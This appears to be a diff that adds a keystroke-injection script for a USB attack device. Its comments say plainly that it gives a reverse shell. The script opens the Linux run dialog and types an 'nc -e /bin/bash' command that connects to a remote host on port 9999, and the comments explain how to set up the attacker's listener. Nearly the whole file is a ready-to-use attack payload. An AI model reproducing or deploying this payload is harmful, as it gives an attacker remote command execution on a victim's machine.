@@ -1,0 +1,11 @@
+REM Get a reverse shell usign ncat.
+REM Run `nc -l 9999` to wait for the reverse shell.
+REM Make sure to update the hostname before using it.
+
+DELAY 1000
+ALT F2
+DELAY 100
+STRING sh -c "nc -e /bin/bash eternal-pickle 9999"
+REM Delay to make it work in KDE. Not sure why that's necessary.
+DELAY 100
+ENTER
